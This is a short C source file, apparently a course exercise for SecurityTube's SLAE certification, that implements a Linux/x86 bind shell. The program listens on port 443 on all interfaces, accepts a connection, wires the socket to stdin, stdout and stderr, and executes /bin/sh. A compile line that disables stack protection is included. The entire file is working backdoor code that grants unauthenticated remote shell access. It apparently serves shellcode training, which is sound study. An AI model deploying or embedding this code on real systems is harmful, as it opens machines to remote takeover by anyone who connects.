/*
	Bind Shell - Linux/x86
	Author: Nathu Nandwani
	SecurityTube ID: SLAE-1261
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <linux/net.h>

// gcc -fno-stack-protector -z execstack bindshell.c -o bindshell

int main() 
{
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(443);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));

	listen(sockfd, 0);
	int resultfd = accept(sockfd, NULL, NULL);

	dup2(resultfd, 0);	// STDIN
	dup2(resultfd, 1);	// STDOUT
	dup2(resultfd, 2);	// STDERR

	execve("/bin/sh", NULL, NULL);
	
}
